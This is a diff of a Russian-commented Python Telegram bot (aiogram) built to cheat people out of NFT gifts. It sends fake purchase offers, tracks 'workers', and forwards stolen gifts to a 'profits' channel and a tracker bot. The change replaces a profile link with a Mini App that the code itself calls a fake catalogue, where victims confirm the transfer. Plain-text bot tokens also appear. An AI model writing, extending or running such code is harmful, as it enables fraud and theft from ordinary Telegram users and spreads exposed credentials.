@@ -8,7 +8,7 @@ from aiogram.enums import ParseMode
 from aiogram.filters import Command
 from aiogram.types import (
     Message, CallbackQuery, LinkPreviewOptions,
-    InlineKeyboardMarkup, InlineKeyboardButton
+    InlineKeyboardMarkup, InlineKeyboardButton, WebAppInfo
 )
 from aiogram.exceptions import TelegramRetryAfter
 
@@ -17,6 +17,9 @@ TOKEN = "9056825852:AAH-AKRlntMSkdLMfEbBqB9HsFcPsZFqabA"
 TARGET_USERNAME = "rattiixx"
 TARGET_ID = 9158877731  # <--- ОБЯЗАТЕЛЬНО ВСТАВЬ СВОЙ ЦИФРОВОЙ ID
 CURRENCY = {"g": "💎", "s": "⭐"}
+
+# ССЫЛКА НА ТВОЙ MINI APP (каталог подарков)
+MINI_APP_URL = "https://molniais80-rgb.github.io/11/"
 
 # --- НАСТРОЙКИ СВЯЗКИ С ТРЕКЕР-БОТОМ ---
 TRACKER_BOT_TOKEN = "8914754146:AAH3WF5wVgNtvfXpomuVCY1KoZ9VrBcGPcw"
@@ -37,11 +40,9 @@ def offer_kb(oid: str) -> InlineKeyboardMarkup:
 
 # Кнопки для второго сообщения (после принятия)
 def instruction_kb() -> InlineKeyboardMarkup:
-    # Ведем на профиль пользователя. Жертва нажмет "Отправить подарок" там.
-    profile_url = f"https://t.me/{TARGET_USERNAME}"
-    
     return InlineKeyboardMarkup(inline_keyboard=[
-        [InlineKeyboardButton(text="🎁 Передать NFT", url=profile_url)],
+        # Открывает Mini App (фейковый каталог)
+        [InlineKeyboardButton(text="🎁 Передать NFT", web_app=WebAppInfo(url=MINI_APP_URL))],
         [InlineKeyboardButton(text="❓ Как передать?", callback_data="alert_2")],
     ])
 
@@ -60,7 +61,7 @@ async def cmd_offer_business(message: Message):
     if not raw_sum.isdigit():
         return await message.answer("Сумма — целое число.")
 
-    # Узнаем ID воркера (того, кто запустил команду через автоматизацию)
+    # Узнаем ID воркера
     try:
         conn = await bot.get_business_connection(message.business_connection_id)
         worker_id = conn.user.id
@@ -80,7 +81,7 @@ async def cmd_offer_business(message: Message):
     # Текст с превью NFT
     caption = f"Пользователь <b>{who}</b> предлагает Вам {raw_sum} {CURRENCY[cur_key]} за подарок <b>{gift_name}</b>.\n\n{url}"
 
-    # 1. Удаляем команду из чата
+    # Удаляем команду
     try:
         await bot.delete_business_messages(
             business_connection_id=message.business_connection_id,
@@ -89,7 +90,7 @@ async def cmd_offer_business(message: Message):
     except Exception as e:
         logging.error(f"delete error: {e}")
 
-    # 2. Отправляем оффер
+    # Отправляем оффер
     try:
         await bot.send_message(
             chat_id=message.chat.id, text=caption, reply_markup=offer_kb(oid),
@@ -131,7 +132,7 @@ async def on_accept(call: CallbackQuery):
 async def show_alert_2(call: CallbackQuery):
     await call.answer(
         "Нажмите «Передать NFT» под сообщением.\n\n"
-        "Вы перейдете в профиль покупателя. Нажмите там «Отправить подарок» и выберите этот подарок.",
+        "В открывшемся окне выберите подарок и подтвердите передачу.",
         show_alert=True
     )
 
@@ -142,7 +143,7 @@ async def on_decline(call: CallbackQuery):
     await call.message.edit_text(text="Вы отклонили предложение.", reply_markup=None)
     await call.answer("Отклонено")
 
-# --- ЛОВИМ ПОДАРОК (ЕСЛИ ОН ПРИХОДИТ В ЛС) ---
+# --- ЛОВИМ ПОДАРОК ---
 @dp.business_message(F.gift)
 async def handle_gift(message: Message):
     gift = message.gift
@@ -159,7 +160,7 @@ async def handle_gift(message: Message):
     base_name = getattr(gift, "base_name", "") or ""
     gift_id = getattr(gift, "id", "")
     
-    # 1. Пересылаем подарок в канал профитов
+    # Пересылаем подарок в канал
     try:
         await bot.forward_message(
             chat_id=PROFIT_CHANNEL_ID, message_thread_id=PROFIT_TOPIC_ID,
@@ -169,7 +170,7 @@ async def handle_gift(message: Message):
     except Exception as e:
         logging.error(f"forward error: {e}")
 
-    # 2. Отправляем команду Трекер-боту
+    # Отправляем команду Трекер-боту
     text = f"/add_profit {worker_id} {stars} {base_name} {gift_id}"
     url = f"https://api.telegram.org/bot{TRACKER_BOT_TOKEN}/sendMessage"
     try:
@@ -182,7 +183,7 @@ async def handle_gift(message: Message):
 
 async def main():
     logging.basicConfig(level=logging.INFO)
-    print("Оффер-бот запущен (подарки на аккаунт)...")
+    print("Оффер-бот запущен (с Mini App)...")
     await dp.start_polling(bot)
 
 if __name__ == "__main__":
